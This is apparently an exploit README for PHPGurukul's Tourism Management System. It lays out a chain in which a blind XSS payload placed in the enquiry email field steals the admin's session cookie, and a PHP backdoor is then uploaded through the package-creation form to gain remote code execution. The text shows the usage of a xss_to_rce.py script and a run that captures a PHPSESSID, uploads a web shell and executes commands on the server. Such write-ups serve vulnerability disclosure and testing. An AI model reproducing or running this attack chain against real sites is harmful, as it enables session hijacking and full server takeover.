# Tourism Management System (XSS,Arbitary File upload to RCE)
- Vulnerable software: https://phpgurukul.com/?smd_process_download=1&download_id=7204
- tested on Kali Linux

## Scenario
- attacker sends blind XSS payload to the admin via enquiry page in parameter `email`
- admin navigates to the `manage enquiry` page, then blind XSS triggered and it sends the admin's session to the attacker
- attacker uses the admin's session to create a package in the `create package` menu and the attacker uploads a PHP backdoor
- run the PHP backdoor on terminal

## PoC
```bash
$ python3 xss_to_rce.py -h                                                        

    >> XSS Stealing Cookies and Arbitary File Upload to RCE
    >> by twseptian

usage: xss_to_rce.py [-h] -t URL -u USERNAME -p PASSWORD

XSS Stealing Cookies and Arbitary File Upload to RCE

optional arguments:
  -h, --help            show this help message and exit
  -t URL, --target URL  Target
  -u USERNAME, --username USERNAME
                        Username target
  -p PASSWORD, --password PASSWORD
                        Password target
```

```bash
$ python3 xss_to_rce.py -t http://localhost/tms -u twsterlab@gmail.com -p password

    >> XSS Stealing Cookies and Arbitary File Upload to RCE
    >> by twseptian

[✓] Logged in successfully
[*] Sending xss vector via enquires
[✓] XSS payload sent successfull
[*] XSS triggered capturing cookies to login
[✓] Grab victim's PHPSESSID: 24o9ebiel17n4ouaklqt8r4l2q 
[*] Uploading PHP Shell For RCE...
[✓] PHP Shell has been uploaded successfully!
[✓] Successfully connected to webshell.
CMD> id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

CMD> ls
14287acc-b5cb-46db-b8b4-e3ffe652fc0d.png
1540382781_shutterstock_661867435.jpg.jpg
1581490262_2_1.jpg
1583140977_5_11.jpg
95995.jpg
BHUTAN-THIMPU-PARO-PUNAKHA-TOUR-6N-7D.jpeg
XAMPP.png
complaints.jpg
coorg-hill-station1.jpg
download (2).jpg
download (3).jpg
images (2).jpg
images.jpg
mamp-pro-logo-big.png
phpgurukul-1.png
phpgurukulhindi.png
sh3llll.php
unnamed.jpg

CMD> 
```
![proof-of-concepts](screenshots/poc.png)